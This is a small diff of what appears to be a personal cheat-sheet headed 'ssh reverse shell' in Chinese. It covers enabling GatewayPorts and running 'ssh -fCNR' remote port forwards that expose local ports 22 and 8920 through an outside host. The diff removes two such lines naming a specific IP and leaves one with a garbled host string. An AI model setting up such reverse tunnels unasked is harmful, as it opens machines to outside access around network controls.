@@ -254,8 +254,6 @@ C7EDCC
 ### ssh 反弹shell ##
 vi /etc/ssh/sshd_config
 GatewayPorts yes
-ssh -fCNR 9891:localhost:8920 sct@118.25.78.198
-ssh -fCNR 9891:localhost:22 sct@118.25.78.198
 
 ssh -fCNR 9891:localhost:8920 root@!!*3@%4&*8!(*
 ssh root@localhost -p7000
